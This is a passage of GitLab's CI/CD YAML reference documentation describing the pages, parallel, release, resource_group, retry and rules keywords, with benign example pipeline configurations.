**Keyword type**: Job keyword. You can use it only as part of a `pages` job.

**Supported values**: A path to a directory containing the Pages content.
In [GitLab 17.10 and later](https://gitlab.com/gitlab-org/gitlab/-/issues/428018),
if not specified, the default `public` directory is used and if specified,
this path is automatically appended to [`artifacts:paths`](https://docs.gitlab.com/ci/yaml/#artifactspaths).

**Example of `pages.publish`**:

YAML Copy to clipboard

```yaml
create-pages:
stage: deploy
script:
    - npx @11ty/eleventy --input=path/to/eleventy/root --output=dist
pages:
    publish: dist  # this path is automatically appended to artifacts:paths
rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
environment: production
```

This example uses [Eleventy](https://www.11ty.dev/) to generate a static website and
output the generated HTML files into a the `dist/` directory. This directory is exported
as an artifact and published with GitLab Pages.

It is also possible to use variables in the `pages.publish` field. For example:

YAML Copy to clipboard

```yaml
create-pages:
stage: deploy
script:
    - mkdir -p $CUSTOM_FOLDER/$CUSTOM_PATH
    - cp -r public $CUSTOM_FOLDER/$CUSTOM_SUBFOLDER
pages:
    publish: $CUSTOM_FOLDER/$CUSTOM_SUBFOLDER  # this path is automatically appended to artifacts:paths
rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
variables:
    CUSTOM_FOLDER: "custom_folder"
    CUSTOM_SUBFOLDER: "custom_subfolder"
```

The publish path specified must be relative to the build root.

**Additional details**:

- The top-level `publish` keyword [is deprecated](https://docs.gitlab.com/ci/yaml/deprecated_keywords/#publish-keyword-and-pages-job-name-for-gitlab-pages) and must now be nested under the `pages` keyword

#### `pages.path_prefix` [Permalink](https://docs.gitlab.com/ci/yaml/\#pagespath_prefix "Permalink")

- Tier: Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated
- Status: Beta

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/129534) in GitLab 16.7 as an [experiment](https://docs.gitlab.com/policy/development_stages_support/) [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `pages_multiple_versions_setting`, disabled by default.
- [Enabled on GitLab.com, GitLab Self-Managed, and GitLab Dedicated](https://gitlab.com/gitlab-org/gitlab/-/issues/422145) in GitLab 17.4.
- [Changed](https://gitlab.com/gitlab-org/gitlab/-/issues/507423) to allow periods in GitLab 17.8.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/487161) in GitLab 17.9. Feature flag `pages_multiple_versions_setting` removed.

Use `pages.path_prefix` to configure a path prefix for [parallel deployments](https://docs.gitlab.com/user/project/pages/#parallel-deployments) of GitLab Pages.

**Keyword type**: Job keyword. You can use it only as part of a `pages` job.

**Supported values**:

- A string
- [CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file)
- A combination of both

The given value is converted to lowercase and shortened to 63 bytes.
Everything except alphanumeric characters or periods is replaced with a hyphen.
Leading and trailing hyphens or periods are not permitted.

**Example of `pages.path_prefix`**:

YAML Copy to clipboard

```yaml
create-pages:
stage: deploy
script:
    - echo "Pages accessible through ${CI_PAGES_URL}/${CI_COMMIT_BRANCH}"
pages:  # specifies that this is a Pages job and publishes the default public directory
    path_prefix: "$CI_COMMIT_BRANCH"
```

In this example, a different pages deployment is created for each branch.

#### `pages.expire_in` [Permalink](https://docs.gitlab.com/ci/yaml/\#pagesexpire_in "Permalink")

- Tier: Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/456478) in GitLab 17.4.
- Support for variables [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/492289) in GitLab 17.11.

Use `expire_in` to specify how long a deployment should be available before
it expires. After the deployment is expired, it’s deactivated by a cron
job running every 10 minutes.

By default, [parallel deployments](https://docs.gitlab.com/user/project/pages/#parallel-deployments) expire
automatically after 24 hours.
To disable this behavior, set the value to `never`.

**Keyword type**: Job keyword. You can use it only as part of a `pages` job.

**Supported values**: The expiry time. If no unit is provided, the time is in seconds.
Variables are also supported. Valid values include:

- `'42'`
- `42 seconds`
- `3 mins 4 sec`
- `2 hrs 20 min`
- `2h20min`
- `6 mos 1 day`
- `47 yrs 6 mos and 4d`
- `3 weeks and 2 days`
- `never`
- `$DURATION`

**Example of `pages.expire_in`**:

YAML Copy to clipboard

```yaml
create-pages:
stage: deploy
script:
    - echo "Pages accessible through ${CI_PAGES_URL}"
pages:  # specifies that this is a Pages job and publishes the default public directory
    expire_in: 1 week
```

### `parallel` [Permalink](https://docs.gitlab.com/ci/yaml/\#parallel "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/336576) in GitLab 15.9, the maximum value for `parallel` is increased from 50 to 200.

Use `parallel` to run a job multiple times in parallel in a single pipeline.

Multiple runners must exist, or a single runner must be configured to run multiple jobs concurrently.

Parallel jobs are named sequentially from `job_name 1/N` to `job_name N/N`.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A numeric value from `1` to `200`.

**Example of `parallel`**:

YAML Copy to clipboard

```yaml
test:
script: rspec
parallel: 5
```

This example creates 5 jobs that run in parallel, named `test 1/5` to `test 5/5`.

**Additional details**:

- Every parallel job has a `CI_NODE_INDEX` and `CI_NODE_TOTAL` [predefined CI/CD variable](https://docs.gitlab.com/ci/variables/#predefined-cicd-variables) set.
- A pipeline with jobs that use `parallel` might:
  - Create more jobs running in parallel than available runners. Excess jobs are queued
    and marked `pending` while waiting for an available runner.
  - Create too many jobs, and the pipeline fails with a `job_activity_limit_exceeded` error.
    The maximum number of jobs that can exist in active pipelines is [limited at the instance-level](https://docs.gitlab.com/administration/instance_limits/#number-of-jobs-in-active-pipelines).

**Related topics**:

- [Parallelize large jobs](https://docs.gitlab.com/ci/jobs/job_control/#parallelize-large-jobs).

#### `parallel:matrix` [Permalink](https://docs.gitlab.com/ci/yaml/\#parallelmatrix "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/336576) in GitLab 15.9, the maximum number of permutations is increased from 50 to 200.

Use `parallel:matrix` to run a job multiple times in parallel in a single pipeline,
but with different variable values for each instance of the job.

Multiple runners must exist, or a single runner must be configured to run multiple jobs concurrently.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: An array of hashes of variables:

- The variable names can use only numbers, letters, and underscores ( `_`).
- The values must be either a string, or an array of strings.
- The number of permutations cannot exceed 200.

**Example of `parallel:matrix`**:

YAML Copy to clipboard

```yaml
deploystacks:
stage: deploy
script:
    - bin/deploy
parallel:
    matrix:
      - PROVIDER: aws
        STACK:
          - monitoring
          - app1
          - app2
      - PROVIDER: ovh
        STACK: [monitoring, backup, app]
      - PROVIDER: [gcp, vultr]
        STACK: [data, processing]
environment: $PROVIDER/$STACK
```

The example generates 10 parallel `deploystacks` jobs, each with different values
for `PROVIDER` and `STACK`:

Copy to clipboard

```plaintext
deploystacks: [aws, monitoring]
deploystacks: [aws, app1]
deploystacks: [aws, app2]
deploystacks: [ovh, monitoring]
deploystacks: [ovh, backup]
deploystacks: [ovh, app]
deploystacks: [gcp, data]
deploystacks: [gcp, processing]
deploystacks: [vultr, data]
deploystacks: [vultr, processing]
```

**Additional details**:

- `parallel:matrix` jobs add the variable values to the job names to differentiate
the jobs from each other, but [large values can cause names to exceed limits](https://gitlab.com/gitlab-org/gitlab/-/issues/362262):

  - [Job names](https://docs.gitlab.com/ci/jobs/#job-names) must be 255 characters or fewer.
  - When using [`needs`](https://docs.gitlab.com/ci/yaml/#needs), job names must be 128 characters or fewer.
- You cannot create multiple matrix configurations with the same variable values but different variable names.
Job names are generated from the variable values, not the variable names, so matrix entries
with identical values generate identical job names that overwrite each other.

For example, this `test` configuration would try to create two series of identical jobs,
but the `OS2` versions overwrite the `OS` versions:



YAML Copy to clipboard





```yaml
test:
    parallel:
      matrix:
      - OS: [ubuntu]
        PROVIDER: [aws, gcp]
      - OS2: [ubuntu]
        PROVIDER: [aws, gcp]
```

  - There’s a [known issue](https://docs.gitlab.com/ci/debugging/#config-should-be-an-array-of-hashes-error-message) when using [`!reference` tags](https://docs.gitlab.com/ci/yaml/yaml_optimization/#reference-tags) with `parallel:matrix`.

**Related topics**:

- [Run a one-dimensional matrix of parallel jobs](https://docs.gitlab.com/ci/jobs/job_control/#run-a-one-dimensional-matrix-of-parallel-jobs).
- [Run a matrix of triggered parallel jobs](https://docs.gitlab.com/ci/jobs/job_control/#run-a-matrix-of-parallel-trigger-jobs).
- [Select different runner tags for each parallel matrix job](https://docs.gitlab.com/ci/jobs/job_control/#select-different-runner-tags-for-each-parallel-matrix-job).

### `release` [Permalink](https://docs.gitlab.com/ci/yaml/\#release "Permalink")

Use `release` to create a [release](https://docs.gitlab.com/user/project/releases/).

The release job must have access to the [`release-cli`](https://gitlab.com/gitlab-org/release-cli/-/tree/master/docs),
which must be in the `$PATH`.

If you use the [Docker executor](https://docs.gitlab.com/runner/executors/docker.html),
you can use this image from the GitLab container registry: `registry.gitlab.com/gitlab-org/release-cli:latest`

If you use the [Shell executor](https://docs.gitlab.com/runner/executors/shell.html) or similar,
[install `release-cli`](https://docs.gitlab.com/user/project/releases/release_cli/) on the server where the runner is registered.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**: The `release` subkeys:

- [`tag_name`](https://docs.gitlab.com/ci/yaml/#releasetag_name)
- [`tag_message`](https://docs.gitlab.com/ci/yaml/#releasetag_message) (optional)
- [`name`](https://docs.gitlab.com/ci/yaml/#releasename) (optional)
- [`description`](https://docs.gitlab.com/ci/yaml/#releasedescription)
- [`ref`](https://docs.gitlab.com/ci/yaml/#releaseref) (optional)
- [`milestones`](https://docs.gitlab.com/ci/yaml/#releasemilestones) (optional)
- [`released_at`](https://docs.gitlab.com/ci/yaml/#releasereleased_at) (optional)
- [`assets:links`](https://docs.gitlab.com/ci/yaml/#releaseassetslinks) (optional)

**Example of `release` keyword**:

YAML Copy to clipboard

```yaml
release_job:
stage: release
image: registry.gitlab.com/gitlab-org/release-cli:latest
rules:
    - if: $CI_COMMIT_TAG                  # Run this job when a tag is created manually
script:
    - echo "Running the release job."
release:
    tag_name: $CI_COMMIT_TAG
    name: 'Release $CI_COMMIT_TAG'
    description: 'Release created using the release-cli.'
```

This example creates a release:

- When you push a Git tag.
- When you add a Git tag in the UI at **Code > Tags**.

**Additional details**:

- All release jobs, except [trigger](https://docs.gitlab.com/ci/yaml/#trigger) jobs, must include the `script` keyword. A release
job can use the output from script commands. If you don’t need the script, you can use a placeholder:



YAML Copy to clipboard





```yaml
script:
  - echo "release job"
```

An [issue](https://gitlab.com/gitlab-org/gitlab/-/issues/223856) exists to remove this requirement.

- The `release` section executes after the `script` keyword and before the `after_script`.

- A release is created only if the job’s main script succeeds.

- If the release already exists, it is not updated and the job with the `release` keyword fails.


**Related topics**:

- [CI/CD example of the `release` keyword](https://docs.gitlab.com/user/project/releases/#creating-a-release-by-using-a-cicd-job).
- [Create multiple releases in a single pipeline](https://docs.gitlab.com/user/project/releases/#create-multiple-releases-in-a-single-pipeline).
- [Use a custom SSL CA certificate authority](https://docs.gitlab.com/user/project/releases/#use-a-custom-ssl-ca-certificate-authority).

#### `release:tag_name` [Permalink](https://docs.gitlab.com/ci/yaml/\#releasetag_name "Permalink")

Required. The Git tag for the release.

If the tag does not exist in the project yet, it is created at the same time as the release.
New tags use the SHA associated with the pipeline.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A tag name.

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `release:tag_name`**:

To create a release when a new tag is added to the project:

- Use the `$CI_COMMIT_TAG` CI/CD variable as the `tag_name`.
- Use [`rules:if`](https://docs.gitlab.com/ci/yaml/#rulesif) to configure the job to run only for new tags.

YAML Copy to clipboard

```yaml
job:
script: echo "Running the release job for the new tag."
release:
    tag_name: $CI_COMMIT_TAG
    description: 'Release description'
rules:
    - if: $CI_COMMIT_TAG
```

To create a release and a new tag at the same time, your [`rules`](https://docs.gitlab.com/ci/yaml/#rules)
should **not** configure the job to run only for new tags. A semantic versioning example:

YAML Copy to clipboard

```yaml
job:
script: echo "Running the release job and creating a new tag."
release:
    tag_name: ${MAJOR}_${MINOR}_${REVISION}
    description: 'Release description'
rules:
    - if: $CI_PIPELINE_SOURCE == "schedule"
```

#### `release:tag_message` [Permalink](https://docs.gitlab.com/ci/yaml/\#releasetag_message "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/363024) in GitLab 15.3. Supported by `release-cli` v0.12.0 or later.

If the tag does not exist, the newly created tag is annotated with the message specified by `tag_message`.
If omitted, a lightweight tag is created.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A text string.

**Example of `release:tag_message`**:

YAML Copy to clipboard

```yaml
release_job:
    stage: release
    release:
      tag_name: $CI_COMMIT_TAG
      description: 'Release description'
      tag_message: 'Annotated tag message'
```

#### `release:name` [Permalink](https://docs.gitlab.com/ci/yaml/\#releasename "Permalink")

The release name. If omitted, it is populated with the value of `release: tag_name`.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A text string.

**Example of `release:name`**:

YAML Copy to clipboard

```yaml
release_job:
    stage: release
    release:
      name: 'Release $CI_COMMIT_TAG'
```

#### `release:description` [Permalink](https://docs.gitlab.com/ci/yaml/\#releasedescription "Permalink")

The long description of the release.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A string with the long description.
- The path to a file that contains the description.
  - The file location must be relative to the project directory ( `$CI_PROJECT_DIR`).
  - If the file is a symbolic link, it must be in the `$CI_PROJECT_DIR`.
  - The `./path/to/file` and filename can’t contain spaces.

**Example of `release:description`**:

YAML Copy to clipboard

```yaml
job:
release:
    tag_name: ${MAJOR}_${MINOR}_${REVISION}
    description: './path/to/CHANGELOG.md'
```

**Additional details**:

- The `description` is evaluated by the shell that runs `release-cli`.
You can use CI/CD variables to define the description, but some shells
[use different syntax](https://docs.gitlab.com/ci/variables/job_scripts/)
to reference variables. Similarly, some shells might require special characters
to be escaped. For example, backticks ( `` ` ``) might need to be escaped with a backslash ( `\`).

#### `release:ref` [Permalink](https://docs.gitlab.com/ci/yaml/\#releaseref "Permalink")

The `ref` for the release, if the `release: tag_name` doesn’t exist yet.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A commit SHA, another tag name, or a branch name.

#### `release:milestones` [Permalink](https://docs.gitlab.com/ci/yaml/\#releasemilestones "Permalink")

The title of each milestone the release is associated with.

#### `release:released_at` [Permalink](https://docs.gitlab.com/ci/yaml/\#releasereleased_at "Permalink")

The date and time when the release is ready.

**Supported values**:

- A date enclosed in quotes and expressed in ISO 8601 format.

**Example of `release:released_at`**:

YAML Copy to clipboard

```yaml
released_at: '2021-03-15T08:00:00Z'
```

**Additional details**:

- If it is not defined, the current date and time is used.

#### `release:assets:links` [Permalink](https://docs.gitlab.com/ci/yaml/\#releaseassetslinks "Permalink")

Use `release:assets:links` to include [asset links](https://docs.gitlab.com/user/project/releases/release_fields/#release-assets) in the release.

Requires `release-cli` version v0.4.0 or later.

**Example of `release:assets:links`**:

YAML Copy to clipboard

```yaml
assets:
links:
    - name: 'asset1'
      url: 'https://example.com/assets/1'
    - name: 'asset2'
      url: 'https://example.com/assets/2'
      filepath: '/pretty/url/1' # optional
      link_type: 'other' # optional
```

### `resource_group` [Permalink](https://docs.gitlab.com/ci/yaml/\#resource_group "Permalink")

Use `resource_group` to create a [resource group](https://docs.gitlab.com/ci/resource_groups/) that
ensures a job is mutually exclusive across different pipelines for the same project.

For example, if multiple jobs that belong to the same resource group are queued simultaneously,
only one of the jobs starts. The other jobs wait until the `resource_group` is free.

Resource groups behave similar to semaphores in other programming languages.

You can choose a [process mode](https://docs.gitlab.com/ci/resource_groups/#process-modes) to strategically control the job concurrency for your deployment preferences. The default process mode is `unordered`. To change the process mode of a resource group, use the [API](https://docs.gitlab.com/api/resource_groups/#edit-an-existing-resource-group) to send a request to edit an existing resource group.

You can define multiple resource groups per environment. For example,
when deploying to physical devices, you might have multiple physical devices. Each device
can be deployed to, but only one deployment can occur per device at any given time.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- Only letters, digits, `-`, `_`, `/`, `$`, `{`, `}`, `.`, and spaces.
It can’t start or end with `/`. CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `resource_group`**:

YAML Copy to clipboard

```yaml
deploy-to-production:
script: deploy
resource_group: production
```

In this example, two `deploy-to-production` jobs in two separate pipelines can never run at the same time. As a result,
you can ensure that concurrent deployments never happen to the production environment.

**Related topics**:

- [Pipeline-level concurrency control with cross-project/parent-child pipelines](https://docs.gitlab.com/ci/resource_groups/#pipeline-level-concurrency-control-with-cross-projectparent-child-pipelines).

### `retry` [Permalink](https://docs.gitlab.com/ci/yaml/\#retry "Permalink")

Use `retry` to configure how many times a job is retried if it fails.
If not defined, defaults to `0` and jobs do not retry.

When a job fails, the job is processed up to two more times, until it succeeds or
reaches the maximum number of retries.

By default, all failure types cause the job to be retried. Use [`retry:when`](https://docs.gitlab.com/ci/yaml/#retrywhen) or [`retry:exit_codes`](https://docs.gitlab.com/ci/yaml/#retryexit_codes)
to select which failures to retry on.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `0` (default), `1`, or `2`.

**Example of `retry`**:

YAML Copy to clipboard

```yaml
test:
script: rspec
retry: 2

test_advanced:
script:
    - echo "Run a script that results in exit code 137."
    - exit 137
retry:
    max: 2
    when: runner_system_failure
    exit_codes: 137
```

`test_advanced` will be retried up to 2 times if the exit code is `137` or if it had
a runner system failure.

#### `retry:when` [Permalink](https://docs.gitlab.com/ci/yaml/\#retrywhen "Permalink")

Use `retry:when` with `retry:max` to retry jobs for only specific failure cases.
`retry:max` is the maximum number of retries, like [`retry`](https://docs.gitlab.com/ci/yaml/#retry), and can be
`0`, `1`, or `2`.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- A single failure type, or an array of one or more failure types:

- `always`: Retry on any failure (default).
- `unknown_failure`: Retry when the failure reason is unknown.
- `script_failure`: Retry when:
  - The script failed.
  - The runner failed to pull the Docker image. For `docker`, `docker+machine`, `kubernetes` [executors](https://docs.gitlab.com/runner/executors/).
- `api_failure`: Retry on API failure.
- `stuck_or_timeout_failure`: Retry when the job got stuck or timed out.
- `runner_system_failure`: Retry if there is a runner system failure (for example, job setup failed).
- `runner_unsupported`: Retry if the runner is unsupported.
- `stale_schedule`: Retry if a delayed job could not be executed.
- `job_execution_timeout`: Retry if the script exceeded the maximum execution time set for the job.
- `archived_failure`: Retry if the job is archived and can’t be run.
- `unmet_prerequisites`: Retry if the job failed to complete prerequisite tasks.
- `scheduler_failure`: Retry if the scheduler failed to assign the job to a runner.
- `data_integrity_failure`: Retry if there is an unknown job problem.

**Example of `retry:when`** (single failure type):

YAML Copy to clipboard

```yaml
test:
script: rspec
retry:
    max: 2
    when: runner_system_failure
```

If there is a failure other than a runner system failure, the job is not retried.

**Example of `retry:when`** (array of failure types):

YAML Copy to clipboard

```yaml
test:
script: rspec
retry:
    max: 2
    when:
      - runner_system_failure
      - stuck_or_timeout_failure
```

#### `retry:exit_codes` [Permalink](https://docs.gitlab.com/ci/yaml/\#retryexit_codes "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/430037) in GitLab 16.10 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_retry_on_exit_codes`. Disabled by default.
- [Enabled on GitLab.com and GitLab Self-Managed](https://gitlab.com/gitlab-org/gitlab/-/issues/430037) in GitLab 16.11.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/452412) in GitLab 17.5. Feature flag `ci_retry_on_exit_codes` removed.

Use `retry:exit_codes` with `retry:max` to retry jobs for only specific failure cases.
`retry:max` is the maximum number of retries, like [`retry`](https://docs.gitlab.com/ci/yaml/#retry), and can be
`0`, `1`, or `2`.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- A single exit code.
- An array of exit codes.

**Example of `retry:exit_codes`**:

YAML Copy to clipboard

```yaml
test_job_1:
script:
    - echo "Run a script that results in exit code 1. This job isn't retried."
    - exit 1
retry:
    max: 2
    exit_codes: 137

test_job_2:
script:
    - echo "Run a script that results in exit code 137. This job will be retried."
    - exit 137
retry:
    max: 1
    exit_codes:
      - 255
      - 137
```

**Related topics**:

You can specify the number of [retry attempts for certain stages of job execution](https://docs.gitlab.com/ci/runners/configure_runners/#job-stages-attempts)
using variables.

### `rules` [Permalink](https://docs.gitlab.com/ci/yaml/\#rules "Permalink")

Use `rules` to include or exclude jobs in pipelines.

Rules are evaluated when the pipeline is created, and evaluated in order. When a match is found,
no more rules are checked and the job is either included or excluded from the pipeline
depending on the configuration. If no rules match, the job is not added to the pipeline.

`rules` accepts an array of rules. Each rules must have at least one of:

- `if`
- `changes`
- `exists`
- `when`

Rules can also optionally be combined with:

- `allow_failure`
- `needs`
- `variables`
- `interruptible`

You can combine multiple keywords together for [complex rules](https://docs.gitlab.com/ci/jobs/job_rules/#complex-rules).

The job is added to the pipeline:

- If an `if`, `changes`, or `exists` rule matches, and is configured with `when: on_success` (default if not defined),
`when: delayed`, or `when: always`.
- If a rule is reached that is only `when: on_success`, `when: delayed`, or `when: always`.

The job is not added to the pipeline:

- If no rules match.
- If a rule matches and has `when: never`.

For additional examples, see [Specify when jobs run with `rules`](https://docs.gitlab.com/ci/jobs/job_rules/).

#### `rules:if` [Permalink](https://docs.gitlab.com/ci/yaml/\#rulesif "Permalink")

Use `rules:if` clauses to specify when to add a job to a pipeline:

- If an `if` statement is true, add the job to the pipeline.
- If an `if` statement is true, but it’s combined with `when: never`, do not add the job to the pipeline.
- If an `if` statement is false, check the next `rules` item (if any more exist).

`if` clauses are evaluated:

- Based on the values of [CI/CD variables](https://docs.gitlab.com/ci/variables/) or [predefined CI/CD variables](https://docs.gitlab.com/ci/variables/predefined_variables/),
with [some exceptions](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).
- In order, following [`rules` execution flow](https://docs.gitlab.com/ci/yaml/#rules).

**Keyword type**: Job-specific and pipeline-specific. You can use it as part of a job
to configure the job behavior, or with [`workflow`](https://docs.gitlab.com/ci/yaml/#workflow) to configure the pipeline behavior.

**Supported values**:

- A [CI/CD variable expression](https://docs.gitlab.com/ci/jobs/job_rules/#cicd-variable-expressions).

**Example of `rules:if`**:

YAML Copy to clipboard

```yaml
job:
script: echo "Hello, Rules!"
rules:
    - if: $CI_MERGE_REQUEST_SOURCE_BRANCH_NAME =~ /^feature/ && $CI_MERGE_REQUEST_TARGET_BRANCH_NAME != $CI_DEFAULT_BRANCH
      when: never
    - if: $CI_MERGE_REQUEST_SOURCE_BRANCH_NAME =~ /^feature/
      when: manual
      allow_failure: true
    - if: $CI_MERGE_REQUEST_SOURCE_BRANCH_NAME
```

**Additional details**:

- You cannot use [nested variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#nested-variable-expansion)
with `if`. See [issue 327780](https://gitlab.com/gitlab-org/gitlab/-/issues/327780) for more details.
- If a rule matches and has no `when` defined, the rule uses the `when`
defined for the job, which defaults to `on_success` if not defined.
- You can [mix `when` at the job-level with `when` in rules](https://gitlab.com/gitlab-org/gitlab/-/issues/219437).
`when` configuration in `rules` takes precedence over `when` at the job-level.
- Unlike variables in [`script`](https://docs.gitlab.com/ci/variables/job_scripts/)
sections, variables in rules expressions are always formatted as `$VARIABLE`.
  - You can use `rules:if` with `include` to [conditionally include other configuration files](https://docs.gitlab.com/ci/yaml/includes/#use-rules-with-include).
- CI/CD variables on the right side of `=~` and `!~` expressions are [evaluated as regular expressions](https://docs.gitlab.com/ci/jobs/job_rules/#store-a-regular-expression-in-a-variable).

**Related topics**:

- [Common `if` expressions for `rules`](https://docs.gitlab.com/ci/jobs/job_rules/#common-if-clauses-with-predefined-variables).
- [Avoid duplicate pipelines](https://docs.gitlab.com/ci/jobs/job_rules/#avoid-duplicate-pipelines).
- [Use `rules` to run merge request pipelines](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/#add-jobs-to-merge-request-pipelines).

#### `rules:changes` [Permalink](https://docs.gitlab.com/ci/yaml/\#ruleschanges "Permalink")

Use `rules:changes` to specify when to add a job to a pipeline by checking for changes
to specific files.

For new branch pipelines or when there is no Git `push` event, `rules: changes` always evaluates to true
and the job always runs. Pipelines like tag pipelines, scheduled pipelines,
and manual pipelines, all do **not** have a Git `push` event associated with them.
To cover these cases, use [`rules: changes: compare_to`](https://docs.gitlab.com/ci/yaml/#ruleschangescompare_to) to specify
the branch to compare against the pipeline ref.

If you do not use `compare_to`, you should use `rules: changes` only with [branch pipelines](https://docs.gitlab.com/ci/pipelines/pipeline_types/#branch-pipeline)
or [merge request pipelines](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/), though
`rules: changes` still evaluates to true when creating a new branch. With:

- Merge request pipelines, `rules:changes` compares the changes with the target MR branch.
- Branch pipelines, `rules:changes` compares the changes with the previous commit on the branch.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

An array including any number of:

- Paths to files. The file paths can include [CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).
- Wildcard paths for:
  - Single directories, for example `path/to/directory/*`.
  - A directory and all its subdirectories, for example `path/to/directory/**/*`.
- Wildcard [glob](https://en.wikipedia.org/wiki/Glob_%28programming%29) paths for all files
with the same extension or multiple extensions, for example `*.md` or `path/to/directory/*.{rb,py,sh}`.
- Wildcard paths to files in the root directory, or all directories, wrapped in double quotes.
For example `"*.json"` or `"**/*.json"`.

**Example of `rules:changes`**:

YAML Copy to clipboard

```yaml
docker build:
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      changes:
        - Dockerfile
      when: manual
      allow_failure: true

docker build alternative:
variables:
    DOCKERFILES_DIR: 'path/to/dockerfiles'
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      changes:
        - $DOCKERFILES_DIR/**/*
```

In this example:

- If the pipeline is a merge request pipeline, check `Dockerfile` and the files in
`$DOCKERFILES_DIR/**/*` for changes.
- If `Dockerfile` has changed, add the job to the pipeline as a manual job, and the pipeline
continues running even if the job is not triggered ( `allow_failure: true`).
- If a file in `$DOCKERFILES_DIR/**/*` has changed, add the job to the pipeline.
- If no listed files have changed, do not add either job to any pipeline (same as `when: never`).

**Additional details**:

- Glob patterns are interpreted with Ruby’s [`File.fnmatch`](https://docs.ruby-lang.org/en/master/File.html#method-c-fnmatch)
with the [flags](https://docs.ruby-lang.org/en/master/File/Constants.html#module-File::Constants-label-Filename+Globbing+Constants+-28File-3A-3AFNM_-2A-29) `File::FNM_PATHNAME | File::FNM_DOTMATCH | File::FNM_EXTGLOB`.
- A maximum of 50 patterns or file paths can be defined per `rules:changes` section.
- `changes` resolves to `true` if any of the matching files are changed (an `OR` operation).
- For additional examples, see [Specify when jobs run with `rules`](https://docs.gitlab.com/ci/jobs/job_rules/).
- You can use the `$` character for both variables and paths. For example, if the
`$VAR` variable exists, its value is used. If it does not exist, the `$` is interpreted
as being part of a path.

**Related topics**:

- [Jobs or pipelines can run unexpectedly when using `rules: changes`](https://docs.gitlab.com/ci/jobs/job_troubleshooting/#jobs-or-pipelines-run-unexpectedly-when-using-changes).

##### `rules:changes:paths` [Permalink](https://docs.gitlab.com/ci/yaml/\#ruleschangespaths "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/90171) in GitLab 15.2.

Use `rules:changes` to specify that a job only be added to a pipeline when specific
files are changed, and use `rules:changes:paths` to specify the files.

`rules:changes:paths` is the same as using [`rules:changes`](https://docs.gitlab.com/ci/yaml/#ruleschanges) without
any subkeys. All additional details and related topics are the same.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- Same as `rules:changes`.

**Example of `rules:changes:paths`**:

YAML Copy to clipboard

```yaml
docker-build-1:
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      changes:
        - Dockerfile

docker-build-2:
script: docker build -t my-image:$CI_COMMIT_REF_SLUG .
rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
      changes:
        paths:
          - Dockerfile
```

In this example, both jobs have the same behavior.

##### `rules:changes:compare_to` [Permalink](https://docs.gitlab.com/ci/yaml/\#ruleschangescompare_to "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/293645) in GitLab 15.3 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_rules_changes_compare`. Enabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/366412) in GitLab 15.5. Feature flag `ci_rules_changes_compare` removed.
- Support for CI/CD variables [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/369916) in GitLab 17.2.

Use `rules:changes:compare_to` to specify which ref to compare against for changes to the files
listed under [`rules:changes:paths`](https://docs.gitlab.com/ci/yaml/#ruleschangespaths).

**Keyword type**: Job keyword. You can use it only as part of a job, and it must be combined with `rules:changes:paths`.

**Supported values**:

- A branch name, like `main`, `branch1`, or `refs/heads/branch1`.
- A tag name, like `tag1` or `refs/tags/tag1`.
- A commit SHA, like `2fg31ga14b`.

